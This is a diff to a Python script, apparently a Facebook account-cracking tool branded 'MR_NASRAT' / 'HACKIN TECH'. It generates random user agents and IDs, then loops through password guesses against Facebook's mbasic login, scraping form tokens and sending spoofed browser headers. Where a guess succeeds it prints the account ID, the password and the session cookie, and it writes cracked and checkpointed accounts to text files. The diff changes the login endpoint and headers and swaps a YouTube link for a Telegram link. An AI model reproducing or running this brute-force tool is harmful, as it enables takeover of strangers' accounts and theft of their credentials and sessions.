@@ -40,11 +40,11 @@ def FD():
 def o():
     os.system('clear')
     print(logo)
-    print('\t ➥RANDOM NUMBER CRACK')
+    print('\t RANDOM NUMBER CRACK')
     print('')
     print('\x1b[1;32m [1]\x1b[1;33m RANDOM COLONING ')
     print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
-    print(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
+    print(' \x1b[1;32m[3] \x1b[1;32mJOYIN MY TELEGRAM CHANNEL')
     print(' \x1b[1;32m[4] \x1b[1;32m Follow My FB ID')
     print(' \x1b[1;32m[00] \x1b[1;31mEXIT')
     opt = input('\n   \x1b[1;32m Choose option >>> ')
@@ -54,7 +54,7 @@ def o():
         os.system('xdg-open https://www.facebook.com/profile.php?id=100024147440412')
         return None
     if None == '3':
-        os.system('xdg-open https://www.youtube.com/@nasratYT')
+        os.system('xdg-open https://t.me/JANRALN')
         return None
     if None == '4':
         os.system('xdg-open https://www.facebook.com/profile.php?id=100024147440412')
@@ -168,7 +168,7 @@ $$ | \$$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | AFG
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNasrat99845.git
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m FREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35mHACKIN TECH
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1.1
 \033[1;37m===============================================
  
        \33[37;41m\t WELLCOME TO MR_NASRAT COMMAND BRO ENJOY\33[0;m
@@ -255,7 +255,7 @@ for xd in range(5000):
     j=random.randrange(4200,4900)
     k=random.randrange(44,160)
     l='Mobile Safari/537.36'
-  #  ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
+ #  ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FB_IAB/FB4A;FBAV/378.0.0.18.112;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/401.0.0.24. 77;]', '[FB_IAB/FB4A;FBAV/381.0.0.29. 105;]', '[FBAN/EMA;FBLC/fr_FR;FBAV /333.0.0.12.108;]', '[FB_IAB/FB4A;FBAV/395.0.0.27. 214;]', '[FB_IAB/FB4A;FBAV/387.0.0.24. 102;]', '[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
   #  m = random.choice(ag)
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
@@ -400,7 +400,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -412,37 +412,33 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = { 
-    'authority': 'x.facebook.com',
-    'method': 'POST',
+    'authority': 'mbasic.facebook.com',
+    'method': 'GET',
     'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
-    'dpr': '2.625',
-    'origin': 'https://x.facebook.com',
-    'referer': 'https://x.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"SM-G975U"',
-    'sec-ch-ua-platform': '"macOS"',
+    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'sb=FHYDZZGMK254lxEqrqHh51L0; datr=FnYDZZSM_QTDHq9xcsf4bsrM; dpr=3; fr=0WS3CAKErGkP33mhH..BlA3YU.yG.AAA.0.0.BlA4SY.AWXTWMqsegY; wd=980x1982',
+    'dpr': '3',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"(Not(A:Brand";v="99"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO CH7n"',
+    'sec-ch-ua-platform': '"iOS"',
     'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': pro,
-    'viewport-width': '412',
-    'x-asbd-id': '129477',
-    'x-fb-lsd': 'AVrqBrF5Idc',
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream',}
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.7.24 (KHTML, like Gecko) Version/11.3.31 Mobile/0EHJU3 Safari/615.10.9',
+    'viewport-width': '980',}    
+             lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(NASRAT➥OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie =🍪 \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(NASRAT➥OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NASRAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -450,14 +446,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(NASRAT➥CP💔)     ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(NASRAT-CP💔)     ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/NASRAT-CP.txt', 'a').write(uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[NASRAT➥OK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[NASRAT] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
